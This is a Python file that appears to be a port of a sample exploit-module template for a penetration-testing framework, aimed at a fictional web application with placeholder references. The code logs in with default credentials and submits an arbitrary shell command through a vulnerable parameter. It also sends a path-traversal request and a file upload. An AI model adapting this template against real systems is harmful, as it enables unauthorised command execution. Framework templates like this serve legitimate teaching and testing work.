#!/usr/bin/env python3
"""
Python port of the sample web application exploit module.
"""

import base64
import os
import re
import sys
from typing import Dict

CURRENT_DIR = os.path.dirname(__file__)
PROJECT_ROOT = os.path.abspath(os.path.join(CURRENT_DIR, "..", ".."))
sys.path.insert(0, os.path.join(PROJECT_ROOT, "python_framework"))

from python_framework.core.exploit import (
    RemoteExploit,
    ExploitInfo,
    ExploitOption,
    ExploitResult,
    ExploitTarget,
    ExploitRank,
    Platform,
    TargetArch,
    PayloadType,
)
from python_framework.helpers.http_client import HttpExploitMixin


class WebAppExploit(RemoteExploit, HttpExploitMixin):
    """Sample web application exploit."""

    def __init__(self):
        info = ExploitInfo(
            name="Sample Webapp Exploit",
            description=(
                "This exploit module illustrates how a vulnerability could be "
                "exploited in a webapp."
            ),
            author=["h00die <mike@stcyrsecurity.com>", "researcher"],
            references=[
                "OSVDB-12345",
                "EDB-12345",
                "http://www.example.com",
                "CVE-1978-1234",
            ],
            disclosure_date="2023-12-30",
            rank=ExploitRank.NORMAL,
            platform=[Platform.LINUX],
            arch=[TargetArch.CMD],
            privileged=False,
            targets=[ExploitTarget(name="Automatic Target", platform=[Platform.LINUX], arch=[TargetArch.CMD], payload_type=PayloadType.UNIX_CMD)],
            default_target=0,
            notes={"Stability": [], "Reliability": [], "SideEffects": []},
        )

        super().__init__(info)

        self.register_options(
            [
                ExploitOption("USERNAME", True, "User to login with", "admin", str),
                ExploitOption("PASSWORD", False, "Password to login with", "123456", str),
                ExploitOption("TARGETURI", True, "Base URI of the application", "/example/", str),
                ExploitOption("CMD", False, "Command to execute via vulnerable parameter", "id", str),
            ]
        )

    def _path(self, *parts: str) -> str:
        base = self.get_option("TARGETURI", "/")
        joined = "/".join(part.strip("/") for part in parts)
        return "/".join([base.rstrip("/"), joined]).replace("//", "/")

    def _basic_auth_header(self) -> Dict[str, str]:
        user = self.get_option("USERNAME", "")
        password = self.get_option("PASSWORD", "")
        token = base64.b64encode(f"{user}:{password}".encode()).decode()
        return {"Authorization": f"Basic {token}"}

    def check(self) -> ExploitResult:
        try:
            response = self.http_get(self._path("index.php"))
        except Exception as exc:
            return ExploitResult(False, f"HTTP request failed: {exc}")

        if response.status_code != 200:
            return ExploitResult(False, f"Unexpected status code: {response.status_code}")

        match = re.search(r"Version:\s*(\d{1,2}\.\d{1,2})", response.text)
        if match:
            version = match.group(1)
            vulnerable = tuple(map(int, version.split("."))) <= (1, 3)
            if vulnerable:
                return ExploitResult(True, f"Version {version} appears vulnerable")
            return ExploitResult(False, f"Version {version} not vulnerable")

        return ExploitResult(False, "Could not determine version")

    def exploit(self) -> ExploitResult:
        login_headers = self._basic_auth_header()
        login_data = {
            "username": self.get_option("USERNAME", ""),
            "password": self.get_option("PASSWORD", ""),
        }

        try:
            login_res = self.http_post(
                self._path("login.php"),
                headers=login_headers,
                data=login_data,
                allow_redirects=False,
            )
        except Exception as exc:
            return ExploitResult(False, f"Login request failed: {exc}")

        if login_res.status_code not in (200, 301, 302):
            return ExploitResult(False, f"Login failed: HTTP {login_res.status_code}")

        cmd = self.get_option("CMD", "id")
        try:
            exec_res = self.http_post(self._path("command.html"), data={"cmd_str": cmd})
        except Exception as exc:
            return ExploitResult(False, f"Exploit request failed: {exc}")

        # Optional RTSP-style request to mirror the Ruby sample
        try:
            self.http_client.request(
                "DESCRIBE",
                "/../" * 4 + "probe.smi",
                headers={"User-Agent": "pf-webapp-exploit"},
                allow_redirects=False,
            )
        except Exception:
            # Non-fatal; some servers will reject this verb
            pass

        # Optional file upload analogue
        try:
            upload_res = self.http_post(
                self._path("async-upload.php"),
                files={"file": ("uploaded.bin", cmd.encode())},
                data={"_wpnonce": "example"},
            )
        except Exception:
            upload_res = None

        message = f"Command submitted ({cmd})"
        data = {
            "login_status": login_res.status_code,
            "exec_status": exec_res.status_code,
            "upload_status": upload_res.status_code if upload_res else None,
        }

        success = exec_res.status_code in (200, 202, 204)
        return ExploitResult(success, message, data)


if __name__ == "__main__":
    exploit = WebAppExploit()
    result = exploit.run()
    status = "success" if result.success else "failure"
    print(f"[{status}] {result.message}")
